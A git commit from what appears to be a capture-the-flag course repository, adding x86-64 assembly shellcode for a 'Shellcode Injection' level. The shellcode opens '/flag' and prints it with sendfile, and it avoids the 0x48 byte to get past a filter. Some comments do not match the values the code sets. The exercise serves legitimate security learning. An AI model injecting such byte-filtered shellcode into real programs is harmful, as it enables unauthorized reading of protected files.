7571f1c473384ae9e1bf6cc5f0f72c3d80b8ece5
he15enbug <0x646f6e676c696e@proton.me>
2024-03-19 23:29:17 +0800

    developed shellcode with no 0x48 byte

--- README.md
+++ README.md
@@ -5,7 +5,7 @@
 ### Program Interaction
 ### Assembly Crash Course
 - Finished in course [CSE 365](https://github.com/he15enbug/cse-365)
-### Shellcode Injection
+### Shellcode Injection **[4/14]**
 ### Debugging Refresher
 - Finished in course [CSE 365](https://github.com/he15enbug/cse-365)
 ### Reverse Engineering
---
+++ Shellcode_Injection/code/babyshell_lv4.s
@@ -0,0 +1,40 @@
+.intel_syntax noprefix
+
+.section .text
+.global _start
+
+_start:
+
+    # push 0x0067616c662f to the stack
+    xor eax, eax
+    pushw 0x67
+    pushw 0x616c
+    pushw 0x662f
+
+    # open('/flag', NULL, NULL)
+    lea edi, [eip+28]
+    xor esi, esi
+    xor edx, edx
+
+    # mov rax, 2
+    xor eax, eax
+    mov al, 0x2
+    syscall
+
+    # sendfile(1, flag_fd, 1, 1000)
+    # mov rdi, 1
+    xor edi, edi
+    mov dil, 0x1
+    mov esi, eax
+    xor edx, edx
+    
+    # mov r10, 100
+    mov r10b, 0x64
+
+    # mov rax, 40
+    xor eax, eax
+    mov al, 0x28
+    syscall
+
+    flag: .ascii "/flag"
+    end_file: .byte 0
